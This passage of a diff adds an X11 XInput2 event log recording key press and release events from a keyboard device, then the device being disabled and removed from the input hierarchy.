+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 13
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 13
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 50
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 50
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 16
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 16
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 16
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 16
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 50
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 50
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x1 effective: 0x1
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 12 (PropertyEvent)
+     property: 155 'Device Enabled'
+     changed: modified
+EVENT type 11 (HierarchyChanged)
+    Changes happened:        [device disabled]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [slave keyboard (3)] is disabled
+    changes:        [device disabled]
+EVENT type 12 (PropertyEvent)
+     property: 278 'Device Product ID'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 277 'Device Node'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 276 'libinput Send Events Mode Enabled Default'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 275 'libinput Send Events Mode Enabled'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 274 'libinput Send Events Modes Available'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 157 'Coordinate Transformation Matrix'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 155 'Device Enabled'
+     changed: deleted
+EVENT type 11 (HierarchyChanged)
+    Changes happened:    [slave removed]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [<undefined> (0)] is disabled
+    changes:    [slave removed]
